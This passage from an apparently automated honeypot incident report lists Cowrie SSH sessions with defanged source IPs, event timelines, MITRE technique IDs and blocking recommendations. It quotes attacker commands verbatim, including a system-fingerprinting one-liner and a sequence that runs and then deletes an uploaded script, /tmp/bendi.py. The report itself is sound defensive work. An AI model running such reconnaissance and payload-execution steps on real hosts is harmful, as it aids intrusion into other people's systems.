| `2026-07-17 03:02:27` | `cowrie.command.input` |
| `2026-07-17 03:02:27` | `cowrie.command.input` |
| `2026-07-17 03:02:27` | `cowrie.command.input` |
| `2026-07-17 03:02:27` | `cowrie.command.success` |
| `2026-07-17 03:02:27` | `cowrie.command.input` |
| `2026-07-17 03:02:27` | `cowrie.command.input` |
| `2026-07-17 03:02:27` | `cowrie.command.input` |
| `2026-07-17 03:02:27` | `cowrie.command.input` |
| `2026-07-17 03:02:28` | `cowrie.log.closed` |
| `2026-07-17 03:02:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95013625a65e

| Field | Detail |
|---|---|
| **Source IP** | `101.13.5[.]49` |
| **First Seen** | 2026-07-17 03:03 |
| **Last Seen** | 2026-07-17 03:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:03:46` | `cowrie.session.connect` |
| `2026-07-17 03:03:46` | `cowrie.client.version` |
| `2026-07-17 03:03:46` | `cowrie.client.kex` |
| `2026-07-17 03:03:49` | `cowrie.login.success` |
| `2026-07-17 03:03:50` | `cowrie.direct-tcpip.request` |
| `2026-07-17 03:03:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.5[.]49` to AbuseIPDB if not already reported
- [ ] Block `101.13.5[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d38ea2c230b7

| Field | Detail |
|---|---|
| **Source IP** | `220.161.52[.]149` |
| **First Seen** | 2026-07-17 03:03 |
| **Last Seen** | 2026-07-17 03:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:03:55` | `cowrie.session.connect` |
| `2026-07-17 03:03:56` | `cowrie.client.version` |
| `2026-07-17 03:03:56` | `cowrie.client.kex` |
| `2026-07-17 03:03:58` | `cowrie.login.success` |
| `2026-07-17 03:03:59` | `cowrie.direct-tcpip.request` |
| `2026-07-17 03:04:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.161.52[.]149` to AbuseIPDB if not already reported
- [ ] Block `220.161.52[.]149` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c82a0b96615

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:03 |
| **Last Seen** | 2026-07-17 03:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:03:59` | `cowrie.session.connect` |
| `2026-07-17 03:03:59` | `cowrie.client.version` |
| `2026-07-17 03:03:59` | `cowrie.client.kex` |
| `2026-07-17 03:04:01` | `cowrie.login.success` |
| `2026-07-17 03:04:02` | `cowrie.session.params` |
| `2026-07-17 03:04:02` | `cowrie.command.input` |
| `2026-07-17 03:04:02` | `cowrie.command.input` |
| `2026-07-17 03:04:02` | `cowrie.command.input` |
| `2026-07-17 03:04:02` | `cowrie.command.input` |
| `2026-07-17 03:04:02` | `cowrie.command.input` |
| `2026-07-17 03:04:02` | `cowrie.command.success` |
| `2026-07-17 03:04:02` | `cowrie.command.input` |
| `2026-07-17 03:04:02` | `cowrie.command.input` |
| `2026-07-17 03:04:02` | `cowrie.command.input` |
| `2026-07-17 03:04:02` | `cowrie.command.input` |
| `2026-07-17 03:04:03` | `cowrie.log.closed` |
| `2026-07-17 03:04:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fed624897f43

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:05 |
| **Last Seen** | 2026-07-17 03:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:05:35` | `cowrie.session.connect` |
| `2026-07-17 03:05:35` | `cowrie.client.version` |
| `2026-07-17 03:05:35` | `cowrie.client.kex` |
| `2026-07-17 03:05:37` | `cowrie.login.success` |
| `2026-07-17 03:05:39` | `cowrie.session.params` |
| `2026-07-17 03:05:39` | `cowrie.command.input` |
| `2026-07-17 03:05:39` | `cowrie.command.input` |
| `2026-07-17 03:05:39` | `cowrie.command.input` |
| `2026-07-17 03:05:39` | `cowrie.command.input` |
| `2026-07-17 03:05:39` | `cowrie.command.input` |
| `2026-07-17 03:05:39` | `cowrie.command.success` |
| `2026-07-17 03:05:39` | `cowrie.command.input` |
| `2026-07-17 03:05:39` | `cowrie.command.input` |
| `2026-07-17 03:05:39` | `cowrie.command.input` |
| `2026-07-17 03:05:39` | `cowrie.command.input` |
| `2026-07-17 03:05:39` | `cowrie.log.closed` |
| `2026-07-17 03:05:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1944af6bb91a

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-17 03:05 |
| **Last Seen** | 2026-07-17 03:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:05:37` | `cowrie.session.connect` |
| `2026-07-17 03:05:37` | `cowrie.client.version` |
| `2026-07-17 03:05:37` | `cowrie.client.kex` |
| `2026-07-17 03:05:37` | `cowrie.login.success` |
| `2026-07-17 03:05:38` | `cowrie.session.params` |
| `2026-07-17 03:05:38` | `cowrie.command.input` |
| `2026-07-17 03:05:39` | `cowrie.log.closed` |
| `2026-07-17 03:05:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3344833da941

| Field | Detail |
|---|---|
| **Source IP** | `81.22.51[.]64` |
| **First Seen** | 2026-07-17 03:06 |
| **Last Seen** | 2026-07-17 03:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:06:40` | `cowrie.session.connect` |
| `2026-07-17 03:06:40` | `cowrie.client.version` |
| `2026-07-17 03:06:40` | `cowrie.client.kex` |
| `2026-07-17 03:06:41` | `cowrie.login.success` |
| `2026-07-17 03:06:42` | `cowrie.direct-tcpip.request` |
| `2026-07-17 03:06:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.22.51[.]64` to AbuseIPDB if not already reported
- [ ] Block `81.22.51[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd2dc527d491

| Field | Detail |
|---|---|
| **Source IP** | `87.225.108[.]138` |
| **First Seen** | 2026-07-17 03:06 |
| **Last Seen** | 2026-07-17 03:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:06:47` | `cowrie.session.connect` |
| `2026-07-17 03:06:47` | `cowrie.client.version` |
| `2026-07-17 03:06:47` | `cowrie.client.kex` |
| `2026-07-17 03:06:49` | `cowrie.login.success` |
| `2026-07-17 03:06:49` | `cowrie.direct-tcpip.request` |
| `2026-07-17 03:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.225.108[.]138` to AbuseIPDB if not already reported
- [ ] Block `87.225.108[.]138` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30c1568ffa59

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:07 |
| **Last Seen** | 2026-07-17 03:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:07:10` | `cowrie.session.connect` |
| `2026-07-17 03:07:11` | `cowrie.client.version` |
| `2026-07-17 03:07:11` | `cowrie.client.kex` |
| `2026-07-17 03:07:12` | `cowrie.login.success` |
| `2026-07-17 03:07:14` | `cowrie.session.params` |
| `2026-07-17 03:07:14` | `cowrie.command.input` |
| `2026-07-17 03:07:14` | `cowrie.command.input` |
| `2026-07-17 03:07:14` | `cowrie.command.input` |
| `2026-07-17 03:07:14` | `cowrie.command.input` |
| `2026-07-17 03:07:14` | `cowrie.command.input` |
| `2026-07-17 03:07:14` | `cowrie.command.success` |
| `2026-07-17 03:07:14` | `cowrie.command.input` |
| `2026-07-17 03:07:14` | `cowrie.command.input` |
| `2026-07-17 03:07:14` | `cowrie.command.input` |
| `2026-07-17 03:07:14` | `cowrie.command.input` |
| `2026-07-17 03:07:14` | `cowrie.log.closed` |
| `2026-07-17 03:07:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c95e3ba8d1a5

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-17 03:07 |
| **Last Seen** | 2026-07-17 03:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:07:42` | `cowrie.session.connect` |
| `2026-07-17 03:07:42` | `cowrie.client.version` |
| `2026-07-17 03:07:42` | `cowrie.client.kex` |
| `2026-07-17 03:07:43` | `cowrie.login.success` |
| `2026-07-17 03:07:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41fbc5539e98

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-17 03:07 |
| **Last Seen** | 2026-07-17 03:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:07:42` | `cowrie.session.connect` |
| `2026-07-17 03:07:42` | `cowrie.client.version` |
| `2026-07-17 03:07:42` | `cowrie.client.kex` |
| `2026-07-17 03:07:43` | `cowrie.login.success` |
| `2026-07-17 03:07:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-772da97f2ef8

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-17 03:07 |
| **Last Seen** | 2026-07-17 03:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:07:51` | `cowrie.session.connect` |
| `2026-07-17 03:07:51` | `cowrie.client.version` |
| `2026-07-17 03:07:51` | `cowrie.client.kex` |
| `2026-07-17 03:07:52` | `cowrie.login.success` |
| `2026-07-17 03:07:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba134f9ab075

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-17 03:07 |
| **Last Seen** | 2026-07-17 03:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:07:52` | `cowrie.session.connect` |
| `2026-07-17 03:07:52` | `cowrie.client.version` |
| `2026-07-17 03:07:52` | `cowrie.client.kex` |
| `2026-07-17 03:07:53` | `cowrie.login.success` |
| `2026-07-17 03:07:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f9861750aa8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:08 |
| **Last Seen** | 2026-07-17 03:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:08:45` | `cowrie.session.connect` |
| `2026-07-17 03:08:45` | `cowrie.client.version` |
| `2026-07-17 03:08:45` | `cowrie.client.kex` |
| `2026-07-17 03:08:47` | `cowrie.login.success` |
| `2026-07-17 03:08:48` | `cowrie.session.params` |
| `2026-07-17 03:08:48` | `cowrie.command.input` |
| `2026-07-17 03:08:48` | `cowrie.command.input` |
| `2026-07-17 03:08:48` | `cowrie.command.input` |
| `2026-07-17 03:08:48` | `cowrie.command.input` |
| `2026-07-17 03:08:48` | `cowrie.command.input` |
| `2026-07-17 03:08:48` | `cowrie.command.success` |
| `2026-07-17 03:08:48` | `cowrie.command.input` |
| `2026-07-17 03:08:48` | `cowrie.command.input` |
| `2026-07-17 03:08:48` | `cowrie.command.input` |
| `2026-07-17 03:08:48` | `cowrie.command.input` |
| `2026-07-17 03:08:49` | `cowrie.log.closed` |
| `2026-07-17 03:08:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3444279607b9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:10 |
| **Last Seen** | 2026-07-17 03:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:10:22` | `cowrie.session.connect` |
| `2026-07-17 03:10:22` | `cowrie.client.version` |
| `2026-07-17 03:10:22` | `cowrie.client.kex` |
| `2026-07-17 03:10:24` | `cowrie.login.success` |
| `2026-07-17 03:10:25` | `cowrie.session.params` |
| `2026-07-17 03:10:25` | `cowrie.command.input` |
| `2026-07-17 03:10:25` | `cowrie.command.input` |
| `2026-07-17 03:10:25` | `cowrie.command.input` |
| `2026-07-17 03:10:25` | `cowrie.command.input` |
| `2026-07-17 03:10:25` | `cowrie.command.input` |
| `2026-07-17 03:10:25` | `cowrie.command.success` |
| `2026-07-17 03:10:25` | `cowrie.command.input` |
| `2026-07-17 03:10:25` | `cowrie.command.input` |
| `2026-07-17 03:10:25` | `cowrie.command.input` |
| `2026-07-17 03:10:25` | `cowrie.command.input` |
| `2026-07-17 03:10:26` | `cowrie.log.closed` |
| `2026-07-17 03:10:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da3abdb9ffe3

| Field | Detail |
|---|---|
| **Source IP** | `35.240.32[.]90` |
| **First Seen** | 2026-07-17 03:10 |
| **Last Seen** | 2026-07-17 03:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:10:29` | `cowrie.session.connect` |
| `2026-07-17 03:10:29` | `cowrie.login.success` |
| `2026-07-17 03:10:29` | `cowrie.session.params` |
| `2026-07-17 03:10:29` | `cowrie.command.input` |
| `2026-07-17 03:10:29` | `cowrie.command.input` |
| `2026-07-17 03:10:29` | `cowrie.command.failed` |
| `2026-07-17 03:10:29` | `cowrie.command.input` |
| `2026-07-17 03:10:29` | `cowrie.log.closed` |
| `2026-07-17 03:10:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.240.32[.]90` to AbuseIPDB if not already reported
- [ ] Block `35.240.32[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b42af892b35f

| Field | Detail |
|---|---|
| **Source IP** | `35.240.32[.]90` |
| **First Seen** | 2026-07-17 03:10 |
| **Last Seen** | 2026-07-17 03:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:10:37` | `cowrie.session.connect` |
| `2026-07-17 03:10:37` | `cowrie.login.success` |
| `2026-07-17 03:10:38` | `cowrie.session.params` |
| `2026-07-17 03:10:38` | `cowrie.command.input` |
| `2026-07-17 03:10:38` | `cowrie.command.failed` |
| `2026-07-17 03:10:39` | `cowrie.log.closed` |
| `2026-07-17 03:10:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.240.32[.]90` to AbuseIPDB if not already reported
- [ ] Block `35.240.32[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa3d5573caec

| Field | Detail |
|---|---|
| **Source IP** | `35.240.32[.]90` |
| **First Seen** | 2026-07-17 03:10 |
| **Last Seen** | 2026-07-17 03:10 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:10:39` | `cowrie.session.connect` |
| `2026-07-17 03:10:39` | `cowrie.login.success` |
| `2026-07-17 03:10:40` | `cowrie.session.params` |
| `2026-07-17 03:10:40` | `cowrie.command.input` |
| `2026-07-17 03:10:52` | `cowrie.log.closed` |
| `2026-07-17 03:10:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.240.32[.]90` to AbuseIPDB if not already reported
- [ ] Block `35.240.32[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a033c867f05

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-17 03:12 |
| **Last Seen** | 2026-07-17 03:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:12:09` | `cowrie.session.connect` |
| `2026-07-17 03:12:09` | `cowrie.client.version` |
| `2026-07-17 03:12:09` | `cowrie.client.kex` |
| `2026-07-17 03:12:10` | `cowrie.login.success` |
| `2026-07-17 03:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c51237aa05f8

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-17 03:12 |
| **Last Seen** | 2026-07-17 03:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:12:10` | `cowrie.session.connect` |
| `2026-07-17 03:12:10` | `cowrie.client.version` |
| `2026-07-17 03:12:10` | `cowrie.client.kex` |
| `2026-07-17 03:12:11` | `cowrie.login.success` |
| `2026-07-17 03:12:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93e46da80bcc

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-17 03:12 |
| **Last Seen** | 2026-07-17 03:14 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:12:16` | `cowrie.session.connect` |
| `2026-07-17 03:12:16` | `cowrie.client.version` |
| `2026-07-17 03:12:16` | `cowrie.client.kex` |
| `2026-07-17 03:12:17` | `cowrie.login.success` |
| `2026-07-17 03:12:18` | `cowrie.session.file_upload` |
| `2026-07-17 03:12:19` | `cowrie.session.params` |
| `2026-07-17 03:12:19` | `cowrie.command.input` |
| `2026-07-17 03:12:19` | `cowrie.command.input` |
| `2026-07-17 03:12:19` | `cowrie.command.input` |
| `2026-07-17 03:12:19` | `cowrie.command.failed` |
| `2026-07-17 03:12:20` | `cowrie.log.closed` |
| `2026-07-17 03:12:21` | `cowrie.session.params` |
| `2026-07-17 03:12:21` | `cowrie.command.input` |
| `2026-07-17 03:12:21` | `cowrie.log.closed` |
| `2026-07-17 03:12:22` | `cowrie.session.params` |
| `2026-07-17 03:12:22` | `cowrie.command.input` |
| `2026-07-17 03:12:22` | `cowrie.log.closed` |
| `2026-07-17 03:12:23` | `cowrie.session.params` |
| `2026-07-17 03:12:23` | `cowrie.command.input` |
| `2026-07-17 03:12:23` | `cowrie.command.failed` |
| `2026-07-17 03:12:23` | `cowrie.command.failed` |
| `2026-07-17 03:13:24` | `cowrie.session.params` |
| `2026-07-17 03:13:24` | `cowrie.command.input` |
| `2026-07-17 03:14:25` | `cowrie.session.closed` |

**Recommended Actions:**
